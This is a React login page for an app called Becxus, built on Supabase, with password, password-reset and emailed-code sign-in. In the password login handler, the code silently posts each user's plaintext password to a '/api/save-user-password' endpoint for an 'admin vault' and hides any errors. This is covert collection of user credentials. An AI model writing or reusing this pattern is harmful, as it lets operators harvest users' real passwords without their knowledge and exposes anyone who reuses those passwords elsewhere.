import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { supabase } from '../lib/supabaseClient';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Logo } from '@/components/brand/logo';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { REGEXP_ONLY_DIGITS } from 'input-otp';
import { Eye, EyeOff, AlertCircle, CheckCircle, ArrowLeft, Mail, Sparkles } from 'lucide-react';

type Mode = 'login' | 'forgot-password' | 'magic-link';

export default function LoginPage() {
  const [mode, setMode] = useState<Mode>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [, setLocation] = useLocation();

  // Magic link state
  const [otpCode, setOtpCode] = useState('');
  const [magicLinkStep, setMagicLinkStep] = useState<'email' | 'code'>('email');
  const [magicLinkEmail, setMagicLinkEmail] = useState('');
  const [resendCooldown, setResendCooldown] = useState(0);

  // Resend cooldown timer
  useEffect(() => {
    if (resendCooldown <= 0) return;
    const timer = setInterval(() => {
      setResendCooldown((prev) => {
        if (prev <= 1) { clearInterval(timer); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [resendCooldown]);

  // Shared helper: fetch or auto-create user profile after auth
  const ensureUserProfile = async (userId: string, userEmail: string | undefined) => {
    let { data: profile, error: profileError } = await supabase
      .from('users').select('*').eq('id', userId).maybeSingle();

    const pendingProfile = localStorage.getItem('pendingProfile');

    if (!profile) {
      let parsed: any = {};
      if (pendingProfile) {
        parsed = JSON.parse(pendingProfile);
        if (parsed.password) {
          const { password: _discardedPassword, ...safePendingProfile } = parsed;
          parsed = safePendingProfile;
          localStorage.setItem('pendingProfile', JSON.stringify(safePendingProfile));
        }
      }

      const userData = {
        id: userId,
        username: parsed.username || userEmail?.split('@')[0] || 'user',
        email: userEmail,
        full_name: parsed.full_name || '',
        phone: parsed.phone || '',
        role: 'user',
        is_active: true,
        is_verified: true,
        credit_score: 0.60,
        display_id: parsed.display_id || Math.random().toString(36).substring(2, 10).toUpperCase()
      };

      const { data: newProfile, error: createError } = await supabase
        .from('users').insert([userData]).select().single();

      if (createError) throw new Error('Failed to create user profile: ' + createError.message);
      profile = newProfile;
      localStorage.removeItem('pendingProfile');
    } else if (profileError) {
      throw profileError;
    }

    if (profile && profile.is_active === false) {
      await supabase.auth.signOut();
      throw new Error('This account has been deactivated. Please contact support.');
    }

    if (profile && !profile.role) profile.role = 'user';
    localStorage.removeItem('pendingProfile');
    localStorage.setItem('userProfile', JSON.stringify(profile));
    try { localStorage.removeItem('fullName'); } catch {}
    return profile;
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    try {
      const { data, error: loginError } = await supabase.auth.signInWithPassword({ email, password });
      if (loginError || !data.user) throw loginError || new Error('Login failed');

      await ensureUserProfile(data.user.id, data.user.email);

      // Sync latest login password into encrypted admin vault record
      try {
        const { data: { session } } = await supabase.auth.getSession();
        const token = session?.access_token;
        if (token && password) {
          await fetch('/api/save-user-password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
            body: JSON.stringify({ password }),
          });
        }
      } catch {}

      window.location.href = '/';
    } catch (err: any) {
      setError(err.message || 'Login failed');
    } finally {
      setLoading(false);
    }
  };

  const handleForgotPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    setSuccess(null);
    try {
      const { error: resetError } = await supabase.auth.resetPasswordForEmail(email, {
        redirectTo: `${window.location.origin}/reset-password`,
      });
      if (resetError) throw resetError;
      setSuccess('Password reset email sent! Check your inbox and follow the link to reset your password.');
    } catch (err: any) {
      setError(err.message || 'Failed to send reset email. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleSendMagicLink = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    setSuccess(null);
    try {
      const { error: otpError } = await supabase.auth.signInWithOtp({ email });
      if (otpError) throw otpError;
      setMagicLinkEmail(email);
      setMagicLinkStep('code');
      setResendCooldown(60);
      setSuccess('A sign-in code has been sent to your email.');
    } catch (err: any) {
      setError(err.message || 'Failed to send sign-in code. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleVerifyOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    setSuccess(null);
    try {
      const { data, error: verifyError } = await supabase.auth.verifyOtp({
        email: magicLinkEmail,
        token: otpCode,
        type: 'email',
      });
      if (verifyError || !data.user) throw verifyError || new Error('Verification failed');
      await ensureUserProfile(data.user.id, data.user.email);
      window.location.href = '/';
    } catch (err: any) {
      setError(err.message || 'Invalid or expired code. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleResendCode = async () => {
    if (resendCooldown > 0) return;
    setLoading(true);
    setError(null);
    setSuccess(null);
    try {
      const { error: otpError } = await supabase.auth.signInWithOtp({ email: magicLinkEmail });
      if (otpError) throw otpError;
      setResendCooldown(60);
      setSuccess('A new code has been sent to your email.');
    } catch (err: any) {
      setError(err.message || 'Failed to resend code.');
    } finally {
      setLoading(false);
    }
  };

  const switchToForgotPassword = () => {
    setMode('forgot-password');
    setError(null);
    setSuccess(null);
    setPassword('');
  };

  const switchToLogin = () => {
    setMode('login');
    setError(null);
    setSuccess(null);
    setOtpCode('');
    setMagicLinkStep('email');
  };

  const switchToMagicLink = () => {
    setMode('magic-link');
    setMagicLinkStep('email');
    setError(null);
    setSuccess(null);
    setOtpCode('');
    setPassword('');
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-[#111] to-[#0a0a0a] p-4">
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-blue-500/5 via-transparent to-transparent" />

      {/* Login Form */}
      {mode === 'login' && (
        <form onSubmit={handleLogin} className="relative z-10 w-full max-w-md space-y-6 bg-[#111] p-8 md:p-10 rounded-2xl border border-[#1e1e1e] shadow-2xl shadow-black/40">
          <div className="flex flex-col items-center mb-2">
            <div className="w-16 h-16 bg-[#1a1a1a] border border-[#2a2a2a] rounded-2xl mb-4 flex items-center justify-center overflow-hidden shadow-lg">
              <Logo className="w-full h-full" />
            </div>
            <h2 className="text-2xl md:text-3xl font-bold mb-1 text-white tracking-tight">Welcome Back</h2>
            <p className="text-gray-500 text-sm">Sign in to your Becxus account</p>
          </div>

          <div>
            <Label htmlFor="email" className="text-sm font-medium text-gray-400 mb-2 block">Email Address</Label>
            <Input
              id="email"
              type="email"
              placeholder="e.g. you@email.com"
              value={email}
              onChange={e => setEmail(e.target.value)}
              required
              className="bg-[#0a0a0a] border-[#2a2a2a] text-white placeholder:text-gray-600 focus:border-blue-500/50 rounded-xl"
            />
          </div>

          <div>
            <div className="flex items-center justify-between mb-2">
              <Label htmlFor="password" className="text-sm font-medium text-gray-400">Password</Label>
              <button
                type="button"
                onClick={switchToForgotPassword}
                className="text-xs text-blue-400 hover:text-blue-300 transition-colors"
              >
                Forgot Password?
              </button>
            </div>
            <div className="relative">
              <Input
                id="password"
                type={showPassword ? 'text' : 'password'}
                placeholder="Enter your password"
                value={password}
                onChange={e => setPassword(e.target.value)}
                required
                className="bg-[#0a0a0a] border-[#2a2a2a] text-white placeholder:text-gray-600 focus:border-blue-500/50 rounded-xl pr-10"
              />
              <button
                type="button"
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
                onClick={() => setShowPassword(v => !v)}
                tabIndex={-1}
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </div>

          {error && (
            <div className="flex items-center gap-2 p-3 bg-red-500/10 border border-red-500/30 rounded-xl">
              <AlertCircle size={16} className="text-red-400 flex-shrink-0" />
              <span className="text-red-400 text-sm">{error}</span>
            </div>
          )}

          <Button
            type="submit"
            className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold rounded-xl shadow-lg shadow-blue-500/20 transition-all"
            disabled={loading}
          >
            {loading ? 'Signing in...' : 'Sign In'}
          </Button>

          <div className="relative flex items-center gap-4">
            <div className="flex-grow border-t border-[#1e1e1e]" />
            <span className="text-xs text-gray-600">or</span>
            <div className="flex-grow border-t border-[#1e1e1e]" />
          </div>

          <button
            type="button"
            onClick={switchToMagicLink}
            className="w-full flex items-center justify-center gap-2 py-2.5 px-4 rounded-xl border border-[#2a2a2a] bg-[#0a0a0a] text-gray-300 hover:bg-[#1a1a1a] hover:text-white transition-all text-sm font-medium"
          >
            <Mail size={16} />
            Sign in with email link
          </button>

          <div className="text-sm text-center mt-2 text-gray-500">
            Don't have an account?{' '}
            <a href="/signup" className="text-blue-400 hover:text-blue-300 transition-colors">Sign up</a>
          </div>
        </form>
      )}

      {/* Forgot Password Form */}
      {mode === 'forgot-password' && (
        <form onSubmit={handleForgotPassword} className="relative z-10 w-full max-w-md space-y-6 bg-[#111] p-8 md:p-10 rounded-2xl border border-[#1e1e1e] shadow-2xl shadow-black/40">
          <div className="flex flex-col items-center mb-2">
            <div className="w-16 h-16 bg-[#1a1a1a] border border-[#2a2a2a] rounded-2xl mb-4 flex items-center justify-center overflow-hidden shadow-lg">
              <Logo className="w-full h-full" />
            </div>
            <div className="w-12 h-12 bg-blue-500/10 border border-blue-500/20 rounded-2xl mb-3 flex items-center justify-center">
              <Mail size={22} className="text-blue-400" />
            </div>
            <h2 className="text-2xl md:text-3xl font-bold mb-1 text-white tracking-tight">Reset Password</h2>
            <p className="text-gray-500 text-sm text-center">Enter your email and we'll send you a reset link</p>
          </div>

          <div>
            <Label htmlFor="reset-email" className="text-sm font-medium text-gray-400 mb-2 block">Email Address</Label>
            <Input
              id="reset-email"
              type="email"
              placeholder="e.g. you@email.com"
              value={email}
              onChange={e => setEmail(e.target.value)}
              required
              className="bg-[#0a0a0a] border-[#2a2a2a] text-white placeholder:text-gray-600 focus:border-blue-500/50 rounded-xl"
            />
          </div>

          {error && (
            <div className="flex items-center gap-2 p-3 bg-red-500/10 border border-red-500/30 rounded-xl">
              <AlertCircle size={16} className="text-red-400 flex-shrink-0" />
              <span className="text-red-400 text-sm">{error}</span>
            </div>
          )}

          {success && (
            <div className="flex items-center gap-2 p-3 bg-green-500/10 border border-green-500/30 rounded-xl">
              <CheckCircle size={16} className="text-green-400 flex-shrink-0" />
              <span className="text-green-400 text-sm">{success}</span>
            </div>
          )}

          <Button
            type="submit"
            className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold rounded-xl shadow-lg shadow-blue-500/20 transition-all"
            disabled={loading || !!success}
          >
            {loading ? 'Sending...' : success ? 'Email Sent' : 'Send Reset Email'}
          </Button>

          <button
            type="button"
            onClick={switchToLogin}
            className="flex items-center gap-2 mx-auto text-sm text-gray-500 hover:text-gray-300 transition-colors"
          >
            <ArrowLeft size={14} />
            Back to Sign In
          </button>
        </form>
      )}

      {/* Magic Link — Email Entry */}
      {mode === 'magic-link' && magicLinkStep === 'email' && (
        <form onSubmit={handleSendMagicLink} className="relative z-10 w-full max-w-md space-y-6 bg-[#111] p-8 md:p-10 rounded-2xl border border-[#1e1e1e] shadow-2xl shadow-black/40">
          <div className="flex flex-col items-center mb-2">
            <div className="w-16 h-16 bg-[#1a1a1a] border border-[#2a2a2a] rounded-2xl mb-4 flex items-center justify-center overflow-hidden shadow-lg">
              <Logo className="w-full h-full" />
            </div>
            <div className="w-12 h-12 bg-blue-500/10 border border-blue-500/20 rounded-2xl mb-3 flex items-center justify-center">
              <Sparkles size={22} className="text-blue-400" />
            </div>
            <h2 className="text-2xl md:text-3xl font-bold mb-1 text-white tracking-tight">Magic Sign-In</h2>
            <p className="text-gray-500 text-sm text-center">Enter your email and we'll send you a sign-in code</p>
          </div>

          <div>
            <Label htmlFor="magic-email" className="text-sm font-medium text-gray-400 mb-2 block">Email Address</Label>
            <Input
              id="magic-email"
              type="email"
              placeholder="e.g. you@email.com"
              value={email}
              onChange={e => setEmail(e.target.value)}
              required
              className="bg-[#0a0a0a] border-[#2a2a2a] text-white placeholder:text-gray-600 focus:border-blue-500/50 rounded-xl"
            />
          </div>

          {error && (
            <div className="flex items-center gap-2 p-3 bg-red-500/10 border border-red-500/30 rounded-xl">
              <AlertCircle size={16} className="text-red-400 flex-shrink-0" />
              <span className="text-red-400 text-sm">{error}</span>
            </div>
          )}

          <Button
            type="submit"
            className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold rounded-xl shadow-lg shadow-blue-500/20 transition-all"
            disabled={loading}
          >
            {loading ? 'Sending...' : 'Send Sign-In Code'}
          </Button>

          <button
            type="button"
            onClick={switchToLogin}
            className="flex items-center gap-2 mx-auto text-sm text-gray-500 hover:text-gray-300 transition-colors"
          >
            <ArrowLeft size={14} />
            Back to Sign In
          </button>
        </form>
      )}

      {/* Magic Link — OTP Code Entry */}
      {mode === 'magic-link' && magicLinkStep === 'code' && (
        <form onSubmit={handleVerifyOtp} className="relative z-10 w-full max-w-md space-y-6 bg-[#111] p-8 md:p-10 rounded-2xl border border-[#1e1e1e] shadow-2xl shadow-black/40">
          <div className="flex flex-col items-center mb-2">
            <div className="w-16 h-16 bg-[#1a1a1a] border border-[#2a2a2a] rounded-2xl mb-4 flex items-center justify-center overflow-hidden shadow-lg">
              <Logo className="w-full h-full" />
            </div>
            <div className="w-12 h-12 bg-blue-500/10 border border-blue-500/20 rounded-2xl mb-3 flex items-center justify-center">
              <Mail size={22} className="text-blue-400" />
            </div>
            <h2 className="text-2xl md:text-3xl font-bold mb-1 text-white tracking-tight">Check Your Email</h2>
            <p className="text-gray-500 text-sm text-center">
              We sent a 6-digit code to{' '}
              <span className="text-blue-400">{magicLinkEmail}</span>
            </p>
          </div>

          <div className="flex justify-center">
            <InputOTP
              maxLength={6}
              pattern={REGEXP_ONLY_DIGITS}
              value={otpCode}
              onChange={(value) => setOtpCode(value)}
            >
              <InputOTPGroup className="gap-2">
                <InputOTPSlot index={0} className="w-12 h-14 text-lg font-semibold bg-[#0a0a0a] border-[#2a2a2a] text-white rounded-xl" />
                <InputOTPSlot index={1} className="w-12 h-14 text-lg font-semibold bg-[#0a0a0a] border-[#2a2a2a] text-white rounded-xl" />
                <InputOTPSlot index={2} className="w-12 h-14 text-lg font-semibold bg-[#0a0a0a] border-[#2a2a2a] text-white rounded-xl" />
              </InputOTPGroup>
              <div className="flex items-center justify-center w-4 text-gray-600">-</div>
              <InputOTPGroup className="gap-2">
                <InputOTPSlot index={3} className="w-12 h-14 text-lg font-semibold bg-[#0a0a0a] border-[#2a2a2a] text-white rounded-xl" />
                <InputOTPSlot index={4} className="w-12 h-14 text-lg font-semibold bg-[#0a0a0a] border-[#2a2a2a] text-white rounded-xl" />
                <InputOTPSlot index={5} className="w-12 h-14 text-lg font-semibold bg-[#0a0a0a] border-[#2a2a2a] text-white rounded-xl" />
              </InputOTPGroup>
            </InputOTP>
          </div>

          {error && (
            <div className="flex items-center gap-2 p-3 bg-red-500/10 border border-red-500/30 rounded-xl">
              <AlertCircle size={16} className="text-red-400 flex-shrink-0" />
              <span className="text-red-400 text-sm">{error}</span>
            </div>
          )}

          {success && (
            <div className="flex items-center gap-2 p-3 bg-green-500/10 border border-green-500/30 rounded-xl">
              <CheckCircle size={16} className="text-green-400 flex-shrink-0" />
              <span className="text-green-400 text-sm">{success}</span>
            </div>
          )}

          <Button
            type="submit"
            className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold rounded-xl shadow-lg shadow-blue-500/20 transition-all"
            disabled={loading || otpCode.length !== 6}
          >
            {loading ? 'Verifying...' : 'Verify Code'}
          </Button>

          <div className="flex items-center justify-between">
            <button
              type="button"
              onClick={() => { setMagicLinkStep('email'); setOtpCode(''); setError(null); setSuccess(null); }}
              className="flex items-center gap-2 text-sm text-gray-500 hover:text-gray-300 transition-colors"
            >
              <ArrowLeft size={14} />
              Change email
            </button>
            <button
              type="button"
              onClick={handleResendCode}
              disabled={resendCooldown > 0 || loading}
              className="text-sm text-blue-400 hover:text-blue-300 transition-colors disabled:text-gray-600 disabled:cursor-not-allowed"
            >
              {resendCooldown > 0 ? `Resend in ${resendCooldown}s` : 'Resend code'}
            </button>
          </div>
        </form>
      )}
    </div>
  );
}
